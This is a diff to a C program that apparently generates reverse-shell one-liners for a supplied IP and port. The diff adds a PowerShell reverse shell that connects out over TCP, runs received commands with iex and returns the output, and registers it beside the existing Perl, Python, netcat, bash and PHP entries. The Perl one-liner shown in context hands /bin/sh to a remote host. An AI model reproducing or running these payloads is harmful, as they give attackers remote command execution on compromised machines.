@@ -32,7 +32,7 @@
 /* Reset Color */
 #define RESET_TERM	"\033[0m"
 
-#define NUMBER_OF_FUNCTIONS	7
+#define NUMBER_OF_FUNCTIONS	8
 
 void usage(void)
 {
@@ -67,6 +67,15 @@ void perl(char *ip, char *port)
     printf(FBLUE DEFAULT);
     printf
         ("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n",
+         ip, port);
+    printf(RESET_TERM);
+}
+
+void powershell(char *ip, char *port)
+{
+    printf(FPURPLE DEFAULT);
+    printf
+        ("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n",
          ip, port);
     printf(RESET_TERM);
 }
@@ -204,6 +213,7 @@ typedef struct {
 language_map_type language_map[NUMBER_OF_FUNCTIONS] = {
     { "python", python },
     { "perl", perl },
+    { "powershell", powershell },
     { "nc", netcat },
     { "bash", bash },
     { "php", php },
